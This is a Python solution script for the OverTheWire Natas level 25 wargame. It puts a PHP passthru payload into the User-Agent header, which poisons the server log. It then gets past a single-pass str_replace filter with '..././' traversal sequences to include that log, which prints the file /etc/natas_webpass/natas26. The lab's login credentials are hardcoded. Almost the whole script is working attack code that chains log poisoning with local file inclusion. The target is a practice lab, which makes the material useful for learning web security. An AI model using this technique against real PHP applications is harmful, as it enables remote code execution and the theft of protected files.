#!/bin/python3
import requests
import string

# Get ourselves logged with a bogus user-agent that has PHP script embedded
s = requests.Session()
s.headers.update({'User-Agent':'<? passthru("cat /etc/natas_webpass/natas26"); ?>'})
url = 'http://natas25.natas.labs.overthewire.org/'
r = s.get(url,auth=('natas25', 'O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx'))

# Open up the log file.  Bypass checks by tricking str_replace, which only
# does one pass from left to right on the string.  PHP embedded in script
# will now execute since the log file is included within the PHP script for
# langugae
sessionid = r.cookies['PHPSESSID']
url = 'http://natas25.natas.labs.overthewire.org/?lang=..././..././..././..././..././var/www/natas/natas25/logs/natas25_' + sessionid + '.log'
r = s.get(url,auth=('natas25', 'O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx'))
print(r.text)
